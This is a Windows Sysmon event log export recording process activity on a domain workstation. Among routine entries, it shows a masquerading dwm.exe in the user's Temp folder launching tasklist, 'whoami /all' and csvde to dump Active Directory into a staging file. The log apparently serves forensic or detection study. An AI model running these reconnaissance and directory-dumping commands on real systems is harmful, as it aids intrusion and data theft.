情報,2019/11/07 15:21:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:21:15.793
ProcessGuid: {CC41BF7E-50DB-5A01-0000-0010C1601F00}
ProcessId: 2648
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-50DB-5A01-0000-001050601F00}
ParentProcessId: 5200
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\csvde.exe -f C:\Intel\Logs\l.txt"""
情報,2019/11/07 15:21:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:21:15.787
ProcessGuid: {CC41BF7E-50DB-5A01-0000-001050601F00}
ProcessId: 5200
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\csvde.exe -f C:\Intel\Logs\l.txt""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:21:01,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:21:01.203
ProcessGuid: {CC41BF7E-50C1-5A01-0000-0010332C1F00}
ProcessId: 2840
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:21:01,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:21:01.171
ProcessGuid: {CC41BF7E-50C2-5A01-0000-001082361F00}
ProcessId: 5948
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:20:50,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:20:50.070
ProcessGuid: {CC41BF7E-50C2-5A01-0000-001082361F00}
ProcessId: 5948
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2840 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-50C1-5A01-0000-0010332C1F00}
ParentProcessId: 2840
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:20:49,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:20:49.934
ProcessGuid: {CC41BF7E-50C1-5A01-0000-0010332C1F00}
ProcessId: 2840
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:20:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:20:35.711
ProcessGuid: {CC41BF7E-50B3-5A01-0000-0010531D1F00}
ProcessId: 2500
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:20:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:20:35.596
ProcessGuid: {CC41BF7E-50B3-5A01-0000-0010531D1F00}
ProcessId: 2500
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:20:20,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:20:20.664
ProcessGuid: {CC41BF7E-50A4-5A01-0000-0010430F1F00}
ProcessId: 5956
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:20:20,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:20:20.599
ProcessGuid: {CC41BF7E-50A4-5A01-0000-0010430F1F00}
ProcessId: 5956
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:20:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:20:16.055
ProcessGuid: {CC41BF7E-509F-5A01-0000-001086081F00}
ProcessId: 5792
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:20:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:20:16.055
ProcessGuid: {CC41BF7E-509F-5A01-0000-00100C081F00}
ProcessId: 5756
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:20:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:20:16.055
ProcessGuid: {CC41BF7E-509F-5A01-0000-0010800A1F00}
ProcessId: 5432
Image: C:\Windows\SysWOW64\whoami.exe"
情報,2019/11/07 15:20:15,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:20:15.914
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:20:15,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:20:15.914
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:20:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:20:15.923
ProcessGuid: {CC41BF7E-509F-5A01-0000-0010800A1F00}
ProcessId: 5432
Image: C:\Windows\SysWOW64\whoami.exe
CommandLine: whoami  /all
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=1D385BBC40537BC8E0257158789284D900802A42
ParentProcessGuid: {CC41BF7E-509F-5A01-0000-00100C081F00}
ParentProcessId: 5756
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""whoami /all"""
情報,2019/11/07 15:20:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:20:15.504
ProcessGuid: {CC41BF7E-509F-5A01-0000-001086081F00}
ProcessId: 5792
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-509F-5A01-0000-00100C081F00}
ParentProcessId: 5756
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""whoami /all"""
情報,2019/11/07 15:20:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:20:15.497
ProcessGuid: {CC41BF7E-509F-5A01-0000-00100C081F00}
ProcessId: 5756
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""whoami /all""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:19:41,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:19:41.867
ProcessGuid: {CC41BF7E-5076-5A01-0000-001040B41C00}
ProcessId: 5812
Image: C:\Windows\System32\wermgr.exe"
情報,2019/11/07 15:19:34,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:19:34.320
ProcessGuid: {CC41BF7E-5076-5A01-0000-0010A3B11C00}
ProcessId: 5632
Image: C:\Windows\System32\wermgr.exe"
情報,2019/11/07 15:19:34,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:19:34.328
ProcessGuid: {CC41BF7E-5076-5A01-0000-001040B41C00}
ProcessId: 5812
Image: C:\Windows\System32\wermgr.exe
CommandLine: C:\Windows\system32\wermgr.exe -upload
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0C0329767FD84B8D5A00C91925DA6BE954AE6610
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:19:34,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:19:34.293
ProcessGuid: {CC41BF7E-5076-5A01-0000-0010A3B11C00}
ProcessId: 5632
Image: C:\Windows\System32\wermgr.exe
CommandLine: ""C:\Windows\system32\wermgr.exe"" ""-outproc"" ""0"" ""900"" ""3512"" ""10928"" ""12504"" ""0"" ""0"" ""0"" ""0"" ""0"" ""0"" ""0"" ""0"" 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0C0329767FD84B8D5A00C91925DA6BE954AE6610
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:19:29,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:19:29.320
ProcessGuid: {CC41BF7E-5070-5A01-0000-001001891C00}
ProcessId: 5956
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:19:29,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:19:29.133
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:19:29,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:19:29.133
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:19:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:19:29.127
ProcessGuid: {CC41BF7E-5071-5A01-0000-00105D971C00}
ProcessId: 1384
Image: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.0_none_36d3ccc3ddfd1ecb\TiWorker.exe
CommandLine: C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.0_none_36d3ccc3ddfd1ecb\TiWorker.exe -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=F957687BE2DD99CCCFD0A2A9D97DA23072640D72
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:19:28,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:19:28.805
ProcessGuid: {CC41BF7E-5070-5A01-0000-0010258E1C00}
ProcessId: 5740
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:19:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:19:28.729
ProcessGuid: {CC41BF7E-5070-5A01-0000-0010258E1C00}
ProcessId: 5740
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe -RegisterDevice -AccountChange
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:19:28,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:19:28.695
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:19:28,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:19:28.695
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:19:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:19:28.702
ProcessGuid: {CC41BF7E-5070-5A01-0000-00100C8C1C00}
ProcessId: 5232
Image: C:\Windows\servicing\TrustedInstaller.exe
CommandLine: C:\Windows\servicing\TrustedInstaller.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=8EB8A94B4906691D7BAAD3C1FA3AA312FB98F59E
ParentProcessGuid: {CC41BF7E-4CCC-5A01-0000-001065750000}
ParentProcessId: 552
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
情報,2019/11/07 15:19:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:19:28.667
ProcessGuid: {CC41BF7E-5070-5A01-0000-001001891C00}
ProcessId: 5956
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe -RegisterUserDevice -NewAccount
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:19:04,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:19:04.945
ProcessGuid: {CC41BF7E-504E-5A01-0000-0010445A1C00}
ProcessId: 6060
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:19:04,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:19:04.930
ProcessGuid: {CC41BF7E-504E-5A01-0000-0010C9641C00}
ProcessId: 5852
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:18:54,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:18:54.359
ProcessGuid: {CC41BF7E-504E-5A01-0000-0010C9641C00}
ProcessId: 5852
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:6060 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-504E-5A01-0000-0010445A1C00}
ParentProcessId: 6060
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:18:54,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:18:54.199
ProcessGuid: {CC41BF7E-504E-5A01-0000-0010445A1C00}
ProcessId: 6060
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:18:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:18:46.320
ProcessGuid: {CC41BF7E-4FC4-5A01-0000-0010585D1A00}
ProcessId: 5436
Image: C:\Windows\System32\SearchFilterHost.exe"
情報,2019/11/07 15:18:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:18:46.320
ProcessGuid: {CC41BF7E-4FC4-5A01-0000-0010495B1A00}
ProcessId: 5988
Image: C:\Windows\System32\SearchProtocolHost.exe"
情報,2019/11/07 15:18:40,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:18:40.586
ProcessGuid: {CC41BF7E-5040-5A01-0000-001023451C00}
ProcessId: 5064
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:18:40,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:18:40.570
ProcessGuid: {CC41BF7E-5040-5A01-0000-0010A9441C00}
ProcessId: 2636
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:18:40,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:18:40.570
ProcessGuid: {CC41BF7E-5040-5A01-0000-0010FF461C00}
ProcessId: 3412
Image: C:\Windows\SysWOW64\tasklist.exe"
情報,2019/11/07 15:18:40,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:18:40.139
ProcessGuid: {CC41BF7E-5040-5A01-0000-0010DD4A1C00}
ProcessId: 4308
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=5935A1978B114199079C01D48407894AF30C07DA
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:18:40,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:18:40.055
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:18:40,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:18:40.055
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:18:40,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:18:40.053
ProcessGuid: {CC41BF7E-5040-5A01-0000-0010FF461C00}
ProcessId: 3412
Image: C:\Windows\SysWOW64\tasklist.exe
CommandLine: tasklist
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=7954D82876F19AA04AF02A11920C798B2CA4BC82
ParentProcessGuid: {CC41BF7E-5040-5A01-0000-0010A9441C00}
ParentProcessId: 2636
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""tasklist"""
情報,2019/11/07 15:18:40,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:18:40.014
ProcessGuid: {CC41BF7E-5040-5A01-0000-001023451C00}
ProcessId: 5064
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-5040-5A01-0000-0010A9441C00}
ParentProcessId: 2636
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""tasklist"""
情報,2019/11/07 15:18:40,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:18:40.008
ProcessGuid: {CC41BF7E-5040-5A01-0000-0010A9441C00}
ProcessId: 2636
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""tasklist""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:18:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:18:35.648
ProcessGuid: {CC41BF7E-503B-5A01-0000-0010E6391C00}
ProcessId: 5692
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:18:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:18:35.600
ProcessGuid: {CC41BF7E-503B-5A01-0000-0010E6391C00}
ProcessId: 5692
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:18:20,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:18:20.664
ProcessGuid: {CC41BF7E-502C-5A01-0000-0010AF251C00}
ProcessId: 3352
Image: C:\Windows\System32\taskhostw.exe"
情報,2019/11/07 15:18:20,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:18:20.598
ProcessGuid: {CC41BF7E-502C-5A01-0000-0010AF251C00}
ProcessId: 3352
Image: C:\Windows\System32\taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9CC394E9F9AEF58F7BDB90B8B19559AB6605CB64
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:18:17,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:18:17.992
ProcessGuid: {CC41BF7E-4FD0-5A01-0000-0010F6421B00}
ProcessId: 6140
Image: C:\Windows\System32\backgroundTaskHost.exe"
